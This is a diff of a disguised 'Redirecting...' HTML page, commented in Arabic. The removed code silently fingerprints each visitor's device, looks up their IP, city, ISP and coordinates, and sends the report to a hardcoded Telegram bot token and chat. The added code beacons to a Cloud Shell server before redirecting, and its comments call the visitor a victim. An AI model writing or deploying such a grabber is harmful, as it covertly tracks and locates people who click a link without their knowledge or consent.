@@ -1,58 +1,27 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
+    <title>Redirecting...</title>
     <script>
-        async function capture() {
-            const token = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
-            const chat_id = "5773364548";
-            const p = new URLSearchParams(window.location.search);
-            const target = p.get('u') || "https://t.me/vo11a";
-
-            // 1. كشف البطارية والـ GPU بدقة (لمعرفة نوع الجهاز)
-            let b = "N/A"; try { const bt = await navigator.getBattery(); b = Math.round(bt.level*100)+"%"; } catch(e){}
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-            const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "null";
-
-            // 2. سحب الـ IP وتفاصيل المحافظة والشركة
-            let d = {ip:"N/A", city:"N/A", region:"N/A", org:"N/A", lat:0, lon:0};
-            try { 
-                const r = await fetch('https://ipapi.co/json/'); 
-                d = await r.json(); 
-            } catch(e){}
-
-            // 3. ترتيب الرسالة (الرصد الاحترافي + رقم 1)
-            const report = `🚀 رصد احترافي - تحليل المواصفات 🚀 1
-━━━━━━━━━━━━━━━
-🌐 الآيبي الخارجي:
-${d.ip}
-
-📱 تحليل نوع الجهاز:
-${navigator.platform} | ${gpu.includes("Apple") ? "iPhone/iPad" : "Android/PC"}
-
-📡 المعالج الرسومي (GPU):
-${gpu}
-
-📍 الموقع: ${d.city} | 🏗️ المحافظة: ${d.region}
-
-🏢 الشركة: ${d.org}
-
-🔋 البطارية: ${b}
-
-🗺️ رابط الخريطة:
-https://www.google.com/maps?q=${d.latitude},${d.longitude}
-━━━━━━━━━━━━━━━ 1`;
-
-            // إرسال البيانات للتليجرام
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(report)}`);
-
-            // 4. الاختصار التلقائي: التحويل الفوري للرابط المطلوب
-            window.location.replace(target);
+        // هذا الرابط هو رابط سيرفر جوجل مالتك (تأكد إنه نفس اللي دزيته)
+        const SERVER_URL = "https://8080-cs-f65a8037-daaf-45b2-a58a-a8f4d4f83c4f.cs-europe-west4-pear.cloudshell.dev/";
+        
+        async function sendData() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const target = urlParams.get('u') || 'https://t.me/vo11a';
+            
+            // إرسال البيانات للسيرفر بالخلفية
+            fetch(`${SERVER_URL}?u=${encodeURIComponent(target)}`, { mode: 'no-cors' });
+            
+            // تحويل الضحية للرابط الحقيقي بعد ثانية وحدة
+            setTimeout(() => {
+                window.location.replace(target);
+            }, 1000);
         }
-        window.onload = capture;
+        window.onload = sendData;
     </script>
 </head>
-<body style="background:#000;"></body>
+<body>
+    <p>Loading...</p>
+</body>
 </html>
